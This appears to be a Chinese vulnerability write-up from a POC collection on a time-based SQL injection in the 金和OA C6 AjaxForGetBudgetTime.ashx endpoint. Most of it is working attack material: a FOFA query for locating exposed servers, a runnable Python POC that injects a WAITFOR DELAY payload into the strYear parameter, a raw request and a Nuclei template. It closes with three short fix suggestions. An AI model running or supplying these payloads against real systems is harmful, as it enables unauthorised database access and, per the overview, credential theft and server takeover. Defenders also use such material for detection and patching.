# 金和OA AjaxForGetBudgetTime.ashx SQL注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 金和OA AjaxForGetBudgetTime.ashx SQL注入漏洞 |
| 漏洞类型 | SQL注入 (延时注入) |
| 影响组件 | 金和OA |
| 影响版本 | 通用版本 |

## 漏洞概述

金和OA C6 AjaxForGetBudgetTime.ashx 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa查询语句

```
app="金和网络-金和OA"
```

## 漏洞复现

### POC

```python
#!/usr/bin/env python3
"""
金和OA AjaxForGetBudgetTime.ashx SQL注入漏洞
POC - 检查漏洞是否存在 (延时注入)
"""
import requests
import sys
import time

def check_vulnerability(target_url, delay=4):
    """检查目标是否存在SQL注入漏洞"""
    target = target_url.rstrip('/') + "/c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx"
    
    # 延时注入 payload
    payload = {
        "strType": "getTime",
        "strTime": "",
        "strYear": "31'WAITFOR DELAY'0:0:" + str(delay) + "'--"
    }
    
    try:
        start_time = time.time()
        response = requests.post(target, data=payload, timeout=15, verify=False)
        end_time = time.time()
        
        elapsed = end_time - start_time
        
        print(f"[+] 请求已发送: {target}")
        print(f"[*] Payload: {payload['strYear']}")
        print(f"[*] 响应时间: {elapsed:.2f}秒")
        
        # 如果响应时间大于设定的延迟时间，说明存在漏洞
        if elapsed >= delay:
            print(f"[+] 漏洞存在! 响应延迟 {elapsed:.2f}秒")
            return True
        else:
            print(f"[-] 漏洞不存在或目标不可达")
            return False
    except requests.Timeout:
        print(f"[+] 漏洞存在! 请求超时(>{delay}秒)")
        return True
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python poc.py <target_url> [delay]")
        print("Example: python poc.py http://192.168.1.1:8080")
        print("Example: python poc.py http://192.168.1.1:8080 5")
        sys.exit(1)
    
    target_url = sys.argv[1]
    delay = int(sys.argv[2]) if len(sys.argv) > 2 else 4
    check_vulnerability(target_url, delay)
```

### 漏洞特征

- 路径：`/c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx`
- 参数：`strType`, `strTime`, `strYear`
- HTTP方法：POST
- 注入类型：延时盲注 (WAITFOR DELAY)

### 原始请求包

```
POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 105

strType=getTime&strTime=&strYear=31'WAITFOR DELAY'0:0:4'--
```

### Nuclei 检测模板

```yaml
id: jinhe-oa-sql-injection

info:
  name: 金和OA SQL注入
  author: 吾要学习
  severity: critical
  description: 金和OA存在SQL注入漏洞

requests:
  - method: POST
    path:
      - "{{BaseURL}}/c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx"
    body: "strType=getTime&strTime=&strYear=31'WAITFOR DELAY'0:0:4'--"
    matchers:
      - type: dsl
        dsl:
          - "duration>=4"
        condition: and
```

## 修复建议

1. 联系厂商打补丁或升级版本
2. 增加 Web 应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限
